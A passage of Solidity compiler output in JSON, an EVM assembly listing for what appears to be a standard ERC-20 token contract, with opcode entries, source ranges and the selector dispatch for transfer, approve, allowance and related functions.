									"end": 3811,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 3738,
									"end": 3812,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 3738,
									"end": 3812,
									"name": "SSTORE",
									"source": 5
								},
								{
									"begin": 3625,
									"end": 3826,
									"name": "tag",
									"source": 5,
									"value": "58"
								},
								{
									"begin": 3625,
									"end": 3826,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 3872,
									"end": 3873,
									"name": "PUSH",
									"source": 5,
									"value": "1"
								},
								{
									"begin": 3856,
									"end": 3870,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 3856,
									"end": 3870,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 3856,
									"end": 3870,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 3852,
									"end": 3874,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 3839,
									"end": 3875,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 3839,
									"end": 3875,
									"name": "SSTORE",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 2790,
									"end": 4142,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 2790,
									"end": 4142,
									"name": "tag",
									"source": 5,
									"value": "16"
								},
								{
									"begin": 2790,
									"end": 4142,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220d4a03f46816d8abc72fd918a2322f2a3c568a20318b17dfd2264e68a262d9d2764736f6c63430008120033",
									".code": [
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "39509351"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "39509351"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "70A08231"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "95D89B41"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "A457C2D7"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "A9059CBB"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "DD62ED3E"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "6FDDE03"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "95EA7B3"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "18160DDD"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "23B872DD"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "313CE567"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1532,
											"end": 12844,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 2158,
											"end": 2256,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 2158,
											"end": 2256,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 4444,
											"end": 4641,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 4444,
											"end": 4641,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1169,
											"end": 1183,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 1169,
											"end": 1183,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 1162,
											"end": 1184,
											"name": "ISZERO",
											"source": 5
										},
										{
											"begin": 1144,
											"end": 1185,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 1144,
											"end": 1185,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 1132,
											"end": 1134,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 1117,
											"end": 1135,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1004,
											"end": 1191,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3342,
											"end": 3354,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 3342,
											"end": 3354,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "SWAP1",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 1330,
											"end": 1332,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 1315,
											"end": 1333,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3255,
											"end": 3361,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1196,
											"end": 1373,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 5203,
											"end": 5459,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 5203,
											"end": 5459,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3104,
											"end": 3195,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 3104,
											"end": 3195,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3104,
											"end": 3195,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3104,
											"end": 3195,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3186,
											"end": 3188,
											"name": "PUSH",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1853,
											"end": 1889,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 1853,
											"end": 1889,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 1841,
											"end": 1843,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 1826,
											"end": 1844,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3104,
											"end": 3195,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1711,
											"end": 1895,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 5854,
											"end": 6088,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "tag",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5854,
											"end": 6088,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "43"
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 3419,
											"end": 3544,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "tag",
											"source": 0,
											"value": "43"
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3493,
											"end": 3500,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 3519,
											"end": 3537,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3419,
											"end": 3544,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 2369,
											"end": 2471,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "51"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 6575,
											"end": 7002,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "tag",
											"source": 0,
											"value": "51"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "52"
										},
										{
											"begin": 6575,
											"end": 7002,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 3740,
											"end": 3929,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "tag",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 3740,
											"end": 3929,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 3987,
											"end": 4136,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "tag",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 3987,
											"end": 4136,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2212,
											"end": 2225,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 2244,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 2237,
											"end": 2249,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "tag",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
